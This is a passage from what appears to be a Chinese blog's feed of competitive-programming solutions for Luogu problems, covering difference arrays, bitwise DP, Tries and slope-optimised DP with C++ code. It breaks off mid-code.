n; i++) N[i].id = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %lld&quot;</span>, &amp;E[i].sid, &amp;E[i].tid, &amp;E[i].w);</span><br><span class="line">        E[i].s = &amp;N[E[i].sid], E[i].t = &amp;N[E[i].tid];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = LLONG_MAX;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> sum = <span class="built_in">kruskal</span>();</span><br><span class="line">    <span class="built_in">prepare</span>(&amp;N[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!E[i].v) &#123;</span><br><span class="line">            Edge *e = &amp;E[i];</span><br><span class="line">            Node *f = <span class="built_in">lca</span>(e-&gt;s, e-&gt;t);</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> sw = <span class="built_in">query</span>(e-&gt;s, f, e-&gt;w);</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> tw = <span class="built_in">query</span>(e-&gt;t, f, e-&gt;w);</span><br><span class="line">            <span class="keyword">if</span> (std::<span class="built_in">max</span>(sw, tw) &gt; LLONG_MIN) ans = std::<span class="built_in">min</span>(ans, sum - std::<span class="built_in">max</span>(sw, tw) + e-&gt;w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>最近公共祖先</tag>
        <tag>倍增</tag>
        <tag>洛谷</tag>
        <tag>最小生成树</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P4321」三步必杀 - 前缀和</title>
    <url>/luogu-4321/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4231">洛谷链接</a></p>
<p><span class="math inline">\(N\)</span>
个柱子排成一排，一开始每个柱子损伤度为 0。</p>
<p>接下来勇仪会进行 <span class="math inline">\(M\)</span>
次攻击，每次攻击可以用 4 个参数<span
class="math inline">\(l\)</span>,<span
class="math inline">\(r\)</span>,<span
class="math inline">\(s\)</span>,<span
class="math inline">\(e\)</span>来描述：</p>
<p>表示这次攻击作用范围为第 <span class="math inline">\(l\)</span>
个到第 <span class="math inline">\(r\)</span> 个之间所有的柱子（包含
<span class="math inline">\(l\)</span>，<span
class="math inline">\(r\)</span>），对第一个柱子的伤害为 <span
class="math inline">\(s\)</span>，对最后一个柱子的伤害为 <span
class="math inline">\(e\)</span>。</p>
<p>攻击产生的伤害值是一个等差数列。若 <span class="math inline">\(l =
1\)</span>，<span class="math inline">\(r = 5\)</span>，<span
class="math inline">\(s = 2\)</span>，<span class="math inline">\(e =
10\)</span>，则对第 1 ~ 5 个柱子分别产生 2, 4, 6, 8, 10 的伤害。</p>
<p>鬼族们需要的是所有攻击完成之后每个柱子的损伤度。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>一道简单但比较有意思的思维题。</p>
<p>我们可以考虑构造一个差分序列 <span
class="math inline">\(\text{diff1}\)</span>，显然对于公差为 <span
class="math inline">\(d\)</span> 等差数列 <span
class="math inline">\(a_{l \cdots r}\)</span>，<span
class="math inline">\(\text{diff1}_{l + 1 \cdots r} =
d\)</span>，但此时对于添加一个等差数列，对于 <span
class="math inline">\(\text{diff1}\)</span> 的操作仍然是 <span
class="math inline">\(O(n)\)</span> 的。此时我们可以考虑对 <span
class="math inline">\(\text{diff1}\)</span> 再构造一个差分序列 <span
class="math inline">\(\text{diff2}\)</span>。对于上述的等差数列，我们仅需要在
<span class="math inline">\(\text{diff2}_l = a_l\)</span>，<span
class="math inline">\(\text{diff2}_{l + 1} = d - a_l\)</span>，<span
class="math inline">\(\text{diff2}_{r + 1} = - d - a_r\)</span>，<span
class="math inline">\(\text{diff2}_{r + 2} = a_r\)</span>
即可，对于单个等差数列把算法优化到 <span
class="math inline">\(O(1)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> diff2[MAXN + <span class="number">3</span>];</span><br><span class="line">    <span class="built_in">memset</span>(diff2, <span class="number">0</span>, <span class="built_in">sizeof</span>(diff2));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> s, e;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %lld %lld&quot;</span>, &amp;l, &amp;r, &amp;s, &amp;e);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            diff2[l] += s;</span><br><span class="line">            diff2[r + <span class="number">1</span>] -= s + e;</span><br><span class="line">            diff2[r + <span class="number">2</span>] += e;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> d = (e - s) / (r - l);</span><br><span class="line">            diff2[l] += s;</span><br><span class="line">            diff2[l + <span class="number">1</span>] -= s - d;</span><br><span class="line">            diff2[r + <span class="number">1</span>] -= e + d;</span><br><span class="line">            diff2[r + <span class="number">2</span>] += e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> diff[MAXN + <span class="number">1</span>];</span><br><span class="line">    diff[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        diff[i] = diff2[i] + diff[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> sumXor = <span class="number">0</span>, maxN = <span class="number">0</span>, each = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        each += diff[i];</span><br><span class="line">        sumXor ^= each;</span><br><span class="line">        maxN = std::<span class="built_in">max</span>(maxN, each);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DBG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld &quot;</span>, each);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DBG</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld %lld\n&quot;</span>, sumXor, maxN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>前缀和</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P4310」绝世好题 - 线性 DP + 位运算</title>
    <url>/luogu-4310/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4310">洛谷链接</a></p>
<p>给定一个长度为 <span class="math inline">\(n\)</span> 的序列 <span
class="math inline">\(a_{1 \cdots n}\)</span>，求它满足 <span
class="math inline">\(\forall i \in \left[ 1, n \right) , b_i \&amp;
b_{i + 1} \neq 0\)</span> 的子序列 <span
class="math inline">\(b\)</span> 的最大长度，其中 <span
class="math inline">\(\&amp;\)</span> 是按位与操作。</p>
<p>数据范围：<span class="math inline">\(1 \leq n \leq 1 \times
10^5\)</span>，<span class="math inline">\(1 \leq a_i \leq
10^9\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然我们可以使用线性 DP 解决这个问题。将遍历到的 a_i
的长度作为状态，很明显有下列转移方程：</p>
<p><span class="math display">\[
f_i = \max \limits_{1 \leq j &lt; i \wedge a_i \&amp; a_j \neq 0} \{ f_j
+ 1 \}
\]</span></p>
<p>但这个算法时间复杂度为 <span
class="math inline">\(O(n^2)\)</span>，在实际测试中仅可获得 60 分。</p>
<p>接下来我们需要优化这个算法。显然在寻找满足 <span
class="math inline">\(1 \leq j &lt; i \bigwedge a_i \&amp; a_j \neq
0\)</span> 的数花的时间过长，我们可以对这进行优化。</p>
<p>我们可以从 <span class="math inline">\(a_i \&amp; a_j \neq 0\)</span>
下手。显然在 <span class="math inline">\(a_i\)</span> 与 <span
class="math inline">\(a_j\)</span>
的二进制表示中必定含有一或以上的位数同时不为 <span
class="math inline">\(0\)</span>。我们可以通过维护一个数组 <span
class="math inline">\(\text{bit}\)</span>，在 <span
class="math inline">\(\text{bit}_x\)</span> 中记录所有在二进制下第 <span
class="math inline">\(x\)</span> 位不为 <span
class="math inline">\(0\)</span> 的 <span
class="math inline">\(a_i\)</span> 对应的 <span
class="math inline">\(f_i\)</span>
的最大值。利用该方法我们可以把上面的状态转移方程优化成下列样式：</p>
<p><span class="math display">\[
f_i = \max \limits_{0 \leq 2^j &lt; a_i} \{ \text{bit}_j + 1 \}
\]</span></p>
<p>在 <span class="math inline">\(f_i\)</span> 计算完毕后更新 <span
class="math inline">\(\text{bit}\)</span> 数组即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> f[MAXN + <span class="number">1</span>], bit[<span class="number">31</span>], ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(bit, <span class="number">0</span>, <span class="built_in">sizeof</span>(bit));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        f[i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; (<span class="number">1ll</span> &lt;&lt; j) &lt;= a[i]; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="number">1</span> &lt;&lt; j) &amp; a[i]) != <span class="number">0</span>) &#123;</span><br><span class="line">                f[i] = std::<span class="built_in">max</span>(f[i], bit[j] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = std::<span class="built_in">max</span>(ans, f[i]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; (<span class="number">1ll</span> &lt;&lt; j) &lt;= a[i]; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="number">1</span> &lt;&lt; j) &amp; a[i]) != <span class="number">0</span>) &#123;</span><br><span class="line">                bit[j] = std::<span class="built_in">max</span>(bit[j], f[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; ans &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>位运算</tag>
        <tag>洛谷</tag>
        <tag>线性 DP</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P4341」外星联络 - Trie</title>
    <url>/luogu-4341/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4341">洛谷链接</a></p>
<p>小 P
在看过电影《超时空接触》(Contact)之后被深深的打动，决心致力于寻找外星人的事业。于是，他每天晚上都爬在屋顶上试图用自己的收音机收听外星人发来的信息。</p>
<p>虽然他收听到的仅仅是一些噪声，但是他还是按照这些噪声的高低电平将接收到的信号改写为由
<code>0</code> 和 <code>1</code> 构成的串，
并坚信外星人的信息就隐藏在其中。他认为，外星人发来的信息一定会在他接受到的
01 串中重复出现，所以他希望找到他接受到的 01 串中所有重复出现次数大于
<span class="math inline">\(1\)</span> 的子串。</p>
<p>但是他收到的信号串实在是太长了，于是，他希望你能编一个程序来帮助他。</p>
<p>对于 <span class="math inline">\(100\%\)</span> 的数据，满足 <span
class="math inline">\(0 \le N \le 3000\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这个数据范围就限制了最高复杂度为 <span
class="math inline">\(O(n^2)\)</span>。</p>
<p>对于所有子串，我们可以建立一颗 Trie。设字符串开头为 <span
class="math inline">\(1\)</span>，插入开头为 <span
class="math inline">\(1\)</span>、<span
class="math inline">\(2\)</span>、<span
class="math inline">\(3\)</span>、<span
class="math inline">\(\cdots\)</span>、<span
class="math inline">\(n\)</span>，结尾均为 <span
class="math inline">\(n\)</span>
的子串。然后从根遍历就可得到所有的子串。然后从根 DFS
统计即可得到答案。</p>
<p>对于字典序，我们可以先 DFS <span class="math inline">\(0\)</span>
节点，再 DFS <span class="math inline">\(1\)</span> 节点。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> trie[MAXN * MAXN + <span class="number">2</span>][<span class="number">2</span>], tot = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> end[MAXN * MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="type">int</span> ch = str[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (trie[p][ch] == <span class="number">0</span>) trie[p][ch] = ++tot;</span><br><span class="line">        p = trie[p][ch];</span><br><span class="line">        end[p]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (end[p] &gt; <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, end[p]);</span><br><span class="line">    <span class="keyword">if</span> (trie[p][<span class="number">0</span>]) <span class="built_in">dfs</span>(trie[p][<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (trie[p][<span class="number">1</span>]) <span class="built_in">dfs</span>(trie[p][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> str[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">insert</span>(str + i, n - i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>洛谷</tag>
        <tag>Trie</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P4341」锯木厂选址 - 斜率优化 DP</title>
    <url>/luogu-4360/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4360">洛谷链接</a></p>
<p>从山顶上到山底下沿着一条直线种植了 <span
class="math inline">\(n\)</span>
棵老树。当地的政府决定把他们砍下来。为了不浪费任何一棵木材，树被砍倒后要运送到锯木厂。</p>
<p>木材只能朝山下运。山脚下有一个锯木厂。另外两个锯木厂将新修建在山路上。你必须决定在哪里修建这两个锯木厂，使得运输的费用总和最小。假定运输每公斤木材每米需要一分钱。</p>
<p>你的任务是编写一个程序，从输入文件中读入树的个数和他们的重量与位置，计算最小运输费用。</p>
<p>数据范围：<span class="math inline">\(n \le 20000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<h2 id="模型建立">模型建立</h2>
<p>首先我们解决 DP 问题。设第 <span class="math inline">\(i\)</span>
颗树的重量为 <span class="math inline">\(w_i\)</span>, <span
class="math inline">\(i\)</span> 到 <span class="math inline">\(i +
1\)</span> 的距离为 <span class="math inline">\(d_i\)</span>。我们可以设
<span class="math inline">\(f_{i, j}\)</span> 表示只考虑前 <span
class="math inline">\(j\)</span> 颗树的情况下，已经有 <span
class="math inline">\(i\)</span> 个锯木厂，且第 <span
class="math inline">\(j\)</span>
个位置为锯木厂的最小运输费用。于是我们可以得出下列转移方程：</p>
<p><span class="math display">\[
f_{i + 1, k} = \min\{ f_{i + 1, k}, f_{i, j} + \sum_{l = i + 1}^{k -
1}(d_i \sum_{m = i + 1}^{l}w_m) \} \quad k \in (i, n + 1]
\]</span></p>
<p>初始化为 <span class="math inline">\(f_{i, j} = \begin{cases} 0 &amp;
i = 0 \wedge j = 0 \\ +\infty &amp; otherwise.
\end{cases}\)</span>，答案显然为 <span class="math inline">\(f_{3, n +
1}\)</span>。</p>
<h2 id="化简">化简</h2>
<p>显然这个方程有许多地方都可以优化。我们首先可以将方程中的求和符号化掉。我们可以预处理
<span class="math inline">\(w\)</span> 的前缀和 <span
class="math inline">\(\text{sw}\)</span>、<span
class="math inline">\(d\)</span> 的前缀和 <span
class="math inline">\(\text{sd}\)</span> 和 <span
class="math inline">\(\text{sw} \times d\)</span> 的前缀和 <span
class="math inline">\(\text{md}\)</span>。即 <span
class="math inline">\(\text{sw}_n = \sum_{i = 1}^{n} w_i\)</span>、<span
class="math inline">\(\text{sd}_n = \sum_{i = 1}^{n} d_i\)</span>、<span
class="math inline">\(\text{md}_n = \sum_{i = 1}^{n}(\text{sw}_i \times
d_i)\)</span>。于是经过一系列数学变化，我们可以将方程化成下列形式。</p>
<p><span class="math display">\[
f_{i + 1, k} = \min\{ f_{i + 1, k}, f_{i, j} + (\text{md}_{k - 1} -
\text{md}_{j - 1}) - \text{sw}_j \times (\text{sd}_{k - 1} -
\text{sd}_{j - 1}) \} \quad k \in (i, n + 1]
\]</span></p>
<p>接下来我们将方程换一下参，得出下列方程：</p>
<p><span class="math display">\[
f_{i, j} = \min\limits_{0 \le k &lt; j} \{ f_{i - 1, k} + (\text{md}_{j
- 1} - \text{md}_{k - 1}) - \text{sw}_k \times (\text{sd}_{j - 1} -
\text{sd}_{k - 1}) \}
\]</span></p>
<p>然后对于 <span class="math inline">\(f_{i, j}\)</span>
的第一维，我们可以将 <span class="math inline">\(g_{j}\)</span> 赋值为
<span class="math inline">\(f_{i - 1, j}\)</span>，然后将方程中的 <span
class="math inline">\(f_{i - 1, j}\)</span>
替换掉。这样即可实现类似于滚动数组的模式。于是可将 <span
class="math inline">\(f\)</span> 转化为一维。计算答案时只需重复计算三次
<span class="math inline">\(f\)</span>，每次计算完成后将 <span
class="math inline">\(f\)</span> 复制到 <span
class="math inline">\(g\)</span>，再清空 <span
class="math inline">\(f\)</span> 即可。可得到下列方程：</p>
<p><span class="math display">\[
f_i = \min\limits_{0 \le j &lt; i} \{ g_j + (\text{md}_{i - 1} -
\text{md}_{j - 1}) - \text{sw}_j (\text{sd}_{i - 1} - \text{sd}_{j - 1})
\}
\]</span></p>
<h2 id="斜率优化">斜率优化</h2>
<p>显然 <span class="math inline">\(\exists j \in (i, n +
1]\)</span>，满足下列方程：</p>
<p><span class="math display">\[
f_i = g_j + (\text{md}_{i - 1} - \text{md}_{j - 1}) - \text{sw}_j
(\text{sd}_{i - 1} - \text{sd}_{j - 1})
\]</span></p>
<p>经过拆括号和移项，可得到下列方程：</p>
<p><span class="math display">\[
g_j - \text{md}_{j - 1} - \text{sw}_j\text{sd}_{j - 1} = \text{sd}_{i -
1}\text{sw}_j + f_i - \text{md}_{i - 1}
\]</span></p>
<p>于是我们可将其看作以 <span class="math inline">\(\text{sd}_{i -
1}\)</span> 为斜率，以 <span class="math inline">\(f_i - \text{md}_{i -
1}\)</span> 为截距，以 <span class="math inline">\(\text{sw}_j\)</span>
为自变量、以 <span class="math inline">\(g_j - \text{md}_{j - 1} -
\text{sw}_j\text{sd}_{j - 1}\)</span> 为因变量的一次函数。由于斜率和去掉
<span class="math inline">\(f_i\)</span>
的截距均为常数，于是我们可以进行斜率优化，即最小化截距以解决问题。</p>
<p>于是我们需要维护每个点。而对于相邻的点 <span class="math inline">\(x
&lt; y\)</span>，当且仅当满足下列不等式时，<span
class="math inline">\(y\)</span> 比 <span
class="math inline">\(x\)</span> 优：</p>
<p><span class="math display">\[
\begin{align*}
g_x + (\text{md}_{i - 1} - \text{md}_{x - 1}) - \text{sw}_x
(\text{sd}_{i - 1} - \text{sd}_{x - 1}) &amp;&gt; \\
g_y + (\text{md}_{i - 1} - \text{md}_{y - 1}) - \text{sw}_y
(\text{sd}_{i - 1} - \text{sd}_{y - 1}) &amp;
\end{align*}
\]</span></p>
<p>经过化简可变化为：</p>
<p><span class="math display">\[
\frac{(g_x - \text{md}_{x - 1} + \text{sw}_x\text{sd}_{x - 1}) - (g_y -
\text{md}_{y - 1} + \text{sw}_y\text{sd}_{y - 1})}{\text{sw}_x -
\text{sw}_y} &lt; \text{sd}_{i - 1}
\]</span></p>
<p>于是我们可以定义相邻 <span class="math inline">\(x &lt; y\)</span>
两点斜率为 <span class="math inline">\(\text{slope}(x, y) = \frac{(g_x -
\text{md}_{x - 1} + \text{sw}_x\text{sd}_{x - 1}) - (g_y - \text{md}_{y
- 1} + \text{sw}_y\text{sd}_{y - 1})}{\text{sw}_x -
\text{sw}_y}\)</span>。我们只需要通过维护一个单调队列来维护这些点。每次取队首的时候就将队首的斜率
<span class="math inline">\(\text{slope}(q_l, q_{l + 1})\)</span>与
<span class="math inline">\(\text{sd}_{i - 1}\)</span>
比较，弹出不够优的点。每次插入新点的时候就比较队尾的斜率 <span
class="math inline">\(\text{slope}(q_{r - 1}, q_r)\)</span> 和 <span
class="math inline">\(\text{slope}(q_r,
i)\)</span>。通过画图以及几何知识得知当 <span
class="math inline">\(\text{slope}(q_{r - 1}, q_r) &gt;\text{slope}(q_r,
i)\)</span> 时，<span class="math inline">\(i\)</span> 比 <span
class="math inline">\(q_r\)</span> 优，弹出不够优的点即可。</p>
<p>最后每次取单调队列队首即为 <span class="math inline">\(f_i\)</span>
的最优答案。编写程序的时候注意一下边界处理即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">w</span><span class="params">(n + <span class="number">1</span>)</span>, <span class="title">d</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>, &amp;w[i], &amp;d[i]);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sw</span><span class="params">(n + <span class="number">1</span>)</span>, <span class="title">sd</span><span class="params">(n + <span class="number">1</span>)</span>, <span class="title">md</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        sw[i] = sw[i - <span class="number">1</span>] + w[i];</span><br><span class="line">        sd[i] = sd[i - <span class="number">1</span>] + d[i];</span><br><span class="line">        md[i] = md[i - <span class="number">1</span>] + sw[i] * d[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">f</span><span class="params">(n + <span class="number">2</span>, LLONG_MAX)</span>, <span class="title">g</span><span class="params">(n + <span class="number">2</span>, LLONG_MAX)</span></span>;</span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> slope = [&amp;](<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> * ((g[x] - (x - <span class="number">1</span> &lt; <span class="number">0</span> ? <span class="number">0</span> : md[x - <span class="number">1</span>]) + sw[x] * (x - <span class="number">1</span> &lt; <span class="number">0</span> ? <span class="number">0</span> : sd[x - <span class="number">1</span>])) -</span><br><span class="line">                      (g[y] - (y - <span class="number">1</span> &lt; <span class="number">0</span> ? <span class="number">0</span> : md[y - <span class="number">1</span>]) + sw[y] * (y - <span class="number">1</span> &lt; <span class="number">0</span> ? <span class="number">0</span> : sd[y - <span class="number">1</span>]))) / </span><br><span class="line">                     (sw[x] - sw[y]);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> _ = <span class="number">1</span>; _ &lt;= <span class="number">3</span>; _++) &#123;</span><br><span class="line">        g = f;</span><br><span class="line">        std::<span class="built_in">fill</span>(f.<span class="built_in">begin</span>(), f.<span class="built_in">end</span>(), LLONG_MAX);</span><br><span class="line">        f[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span 